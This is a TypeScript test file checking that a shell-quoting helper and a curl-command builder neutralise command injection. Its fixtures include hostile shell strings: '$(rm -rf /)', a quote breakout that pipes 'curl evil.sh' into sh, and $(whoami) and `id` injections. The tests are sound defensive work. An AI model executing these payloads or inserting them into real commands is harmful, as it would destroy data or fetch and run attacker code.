import { describe, expect, it } from 'vitest'

import { buildCurl, shq } from './curl'
import type { EventDetail } from '#/lib/api'

describe('shq', () => {
  it('wraps in single quotes so the shell cannot expand the content', () => {
    expect(shq('hello')).toBe("'hello'")
    // $(), backticks and $VAR are inert inside single quotes.
    expect(shq('$(rm -rf /)')).toBe("'$(rm -rf /)'")
    expect(shq('`id`')).toBe("'`id`'")
    expect(shq('$HOME')).toBe("'$HOME'")
  })

  it('escapes embedded single quotes by closing, escaping, reopening', () => {
    expect(shq("a'b")).toBe("'a'\\''b'")
    // The classic breakout: a single quote must not end the quoting early.
    expect(shq("'; curl evil.sh | sh; '")).toBe("''\\''; curl evil.sh | sh; '\\'''")
  })
})

describe('buildCurl', () => {
  // Minimal structural EventDetail — only the fields buildCurl reads.
  const ev = (over: Partial<EventDetail['request']> & { url?: string }): EventDetail =>
    ({
      destination: { url: over.url ?? 'https://x.test' },
      request: {
        method: over.method ?? 'POST',
        headers: over.headers ?? {},
        body: over.body,
      },
    }) as unknown as EventDetail

  it('neutralises command injection from an attacker-controlled body', () => {
    const out = buildCurl(ev({ body: '{"a":"$(curl evil.sh|sh)"}' }))
    // The payload is single-quoted, so no $(...) survives unquoted.
    expect(out).toContain('--data \'{"a":"$(curl evil.sh|sh)"}\'')
    expect(out).not.toMatch(/--data "/) // never double-quoted
  })

  it('single-quotes method, url and header values', () => {
    const out = buildCurl(
      ev({ method: 'POST', url: 'https://x.test/`id`', headers: { 'X-Evil': '$(whoami)' } }),
    )
    expect(out).toContain("curl -X 'POST' 'https://x.test/`id`'")
    expect(out).toContain("-H 'X-Evil: $(whoami)'")
  })

  it('escapes a single quote inside a header so it cannot break out', () => {
    const out = buildCurl(ev({ headers: { 'X-Q': "a'; id; '" } }))
    expect(out).toContain("-H 'X-Q: a'\\''; id; '\\'''")
  })
})
